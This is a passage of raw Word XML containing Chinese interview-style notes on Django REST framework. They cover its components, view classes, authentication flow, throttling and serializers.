        <w:t>#数据传输格式:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519BB96B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA9B72F" w14:textId="15B19E0F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#     2.xml </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE5787D" w14:textId="6E963E22"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045</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4C3B43" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#能自动生成符合 RESTful 规范的 API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698A49BC" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.在开发REST API的视图中，虽然每个视图具体操作的数据不同，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793BADAD" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#但增、删、改、查的实现流程基本一样,这部分的代码可以简写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0182B3C6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.在序列化与反序列化时，虽然操作的数据不同，但是执行的过程却相似,这部分的代码也可以简写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5298A1" w14:textId="17B72A30" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#REST framework可以帮助简化上述两部分的代码编写，大大提高REST API的开发速度</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9F80BE" w14:textId="0B2E6F41"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046</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架中都有那些组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1ABB42" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#1.序列化组件:serializers  对queryset序列化以及对请求数据格式校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8EC2B2" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.路由组件routers 进行路由分发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECFF9D6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.视图组件ModelViewSet  帮助开发者提供了一些类，并在类中提供了多个方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB0520C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#4.认证组件 写一个类并注册到认证类(authentication_classes)，在类的的authticate方法中编写认证逻</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26485EE4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#5.权限组件 写一个类并注册到权限类(permission_classes)，在类的的has_permission方法中编写认证逻辑。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416D2413" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#6.频率限制 写一个类并注册到频率类(throttle_classes)，在类的的allow_request/wait 方法中编写认证逻辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130DBF2D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#7.解析器  选择对数据解析的类，在解析器类中注册(parser_classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116BE5C3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#8.渲染器 定义数据如何渲染到到页面上,在渲染器类中注册(renderer_classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735A1718" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#9.分页  对获取到的数据进行分页处理, pagination_class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6234E8D4" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#10.版本  版本控制用来在不同的客户端使用不同的行为</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41726B17" w14:textId="47F7DD17" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#在url中设置version参数，用户请求时候传入参数。在request.version中获取版本，根据版本不同 做不同处理 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6D3FB5" w14:textId="18BF26DA"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047</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架中的视图都可以继承哪些类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3331C657" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class View(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1792CB4E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class APIView(View): 封装了view,并且重新封装了request,初始化了各种组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758E1EB0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class GenericAPIView(views.APIView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683C3E58" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.增加了一些属性和方法,如get_queryset,get_serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A30B246" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class GenericViewSet(ViewSetMixin, generics.GenericAPIView)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69340E61" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#父类ViewSetMixin 重写了as_view,返回return csrf_exempt(view)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D188F1C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#并重新设置请求方式与执行函数的关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0236DFEB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class ModelViewSet(mixins.CreateModelMixin,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E38FD6F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                   mixins.RetrieveModelMixin,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5F549B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                   mixins.UpdateModelMixin,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533DA183" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                   mixins.DestroyModelMixin,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6A0B4F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                   mixins.ListModelMixin,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4540C50B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#                   GenericViewSet):pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D40DD6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#继承了mixins下的一些类,封装了list,create,update等方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEE37AB" w14:textId="556413FC" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#和GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDA80A7" w14:textId="47FB4014"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048</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架的认证流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35863EDD" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.用户请求走进来后,走APIView,初始化了默认的认证方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2686F6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.走到APIView的dispatch方法,initial方法调用了request.user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37800319" w14:textId="44C36365" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.如果我们配置了认证类,走我们自己认证类中的authentication方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4503AA27" w14:textId="0F767B79"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049</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何实现的用户访问频率控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A36C5D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#使用IP/用户账号作为键，每次的访问时间戳作为值，构造一个字典形式的数据，存起来，每次访问时对时间戳列表的元素进行判断，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70810F96" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">#把超时的删掉，再计算列表剩余的元素数就能做到频率限制了 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093E1B09" w14:textId="796150CC" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#匿名用户：使用IP控制，但是无法完全控制，因为用户可以换代理IP登录用户：使用账号控制，但是如果有很多账号，也无法限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9FE291" w14:textId="4C92EB95"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050</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>rest_framework</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>序列化组件的作用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>以及一些外键关系的钩子方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C3944A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#作用：帮助我们序列化数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581CBCE3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.choices  get_字段名_display</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618740C8" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
